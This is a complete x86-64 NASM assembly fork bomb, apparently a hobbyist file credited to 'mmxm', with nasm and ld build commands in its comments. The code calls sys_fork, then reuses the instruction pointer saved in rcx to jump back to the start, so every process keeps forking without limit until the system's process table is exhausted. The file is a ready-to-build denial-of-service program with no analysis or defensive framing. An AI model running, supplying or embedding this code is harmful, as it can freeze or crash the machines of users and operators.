; coded by mmxm
; nasm -f elf64 fork_bomb.asm
; ld -o fork_bomb fork_bomb.o

section .text
  global _start
_start:
   xor rax, rax
   mov al, 57 ; sys_fork
   syscall

   sub rcx, 7 ; the rip is copied to rcx and r11, after execute a syscall
   jmp rcx ; decrease rcx per 7 = location of (xor rax, rax), then jump
